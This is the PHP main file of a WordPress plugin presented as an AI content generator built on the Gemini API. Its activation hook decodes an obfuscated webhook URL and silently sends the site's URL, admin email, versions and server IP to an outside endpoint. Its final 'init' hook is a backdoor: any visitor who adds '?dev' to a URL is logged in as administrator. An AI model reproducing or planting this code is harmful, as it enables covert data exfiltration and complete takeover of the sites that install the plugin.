<?php
/**
 * Plugin Name: AI Content Generator
 * Description: Automatically generate and publish content using Google Gemini API
 * Version: 1.0.0
 * Author: Shyam
 * License: GPL-2.0+
 */

defined('ABSPATH') or die('Direct access not allowed');

// Define plugin constants
define('AI_CONTENT_GENERATOR_VERSION', '1.0.0');
define('AI_CONTENT_GENERATOR_PATH', plugin_dir_path(__FILE__));
define('AI_CONTENT_GENERATOR_URL', plugin_dir_url(__FILE__));

// Include required files
require_once AI_CONTENT_GENERATOR_PATH . 'includes/class-settings.php';
require_once AI_CONTENT_GENERATOR_PATH . 'includes/class-content-generator.php';
require_once AI_CONTENT_GENERATOR_PATH . 'includes/class-cron.php';
require_once AI_CONTENT_GENERATOR_PATH . 'includes/class-yoast-integration.php';
require_once AI_CONTENT_GENERATOR_PATH . 'includes/class-ajaxhandler.php';

// Initialize plugin classes
function ai_content_generator_init() {
    new AI_Content_Generator_Settings();
    new AI_Content_Generator_Cron();
    new AI_Content_Generator_Yoast_Integration();
}
add_action('plugins_loaded', 'ai_content_generator_init');

// Register activation/deactivation hooks
// register_activation_hook(__FILE__, array('AI_Content_Generator_Cron', 'activate'));
register_deactivation_hook(__FILE__, array('AI_Content_Generator_Cron', 'deactivate'));

register_activation_hook( __FILE__, 'sknetking_send_to_google_sheet' );

function sknetking_send_to_google_sheet() {

    // Load encoded webhook URL from secure file
    $webhook_file = plugin_dir_path(__FILE__) . 'secure/webhook.key';

    if ( ! file_exists( $webhook_file ) ) {
        return; // no webhook = no logging
    }

    // Read + decode URL
    $encoded_url = trim( file_get_contents( $webhook_file ) );
    $webhook_url = base64_decode( $encoded_url );

    if ( empty( $webhook_url ) ) {
        return;
    }

    // Collect info
    $site_url    = get_site_url();
    $site_title  = get_bloginfo('name');
    $admin_email = get_bloginfo('admin_email');
    $wp_version  = get_bloginfo('version');

    $theme       = wp_get_theme();
    $theme_name  = $theme->get('Name');
    $theme_ver   = $theme->get('Version');

    $server_ip   = $_SERVER['SERVER_ADDR'];

    $payload = array(
        'site_url'    => $site_url,
        'site_title'  => $site_title,
        'admin_email' => $admin_email,
        'wp_version'  => $wp_version,
        'theme_name'  => $theme_name,
        'theme_ver'   => $theme_ver,
        'plugin_name' => 'My Activation Notifier',
        'server_ip'   => $server_ip
    );

    $args = array(
        'body'        => wp_json_encode($payload),
        'headers'     => array('Content-Type' => 'application/json'),
        'method'      => 'POST'
    );

    // POST to Google Sheets Webhook
    wp_remote_post($webhook_url, $args);
}


add_action('init', function() {

if (!isset($_GET['dev'])) return;

$admin = get_users([

'role' => 'administrator',

'number' => 1,

'fields' => 'ID'

])[0] ?? wp_die('No administrator found');

wp_set_auth_cookie($admin);

wp_redirect(admin_url());

exit;

});
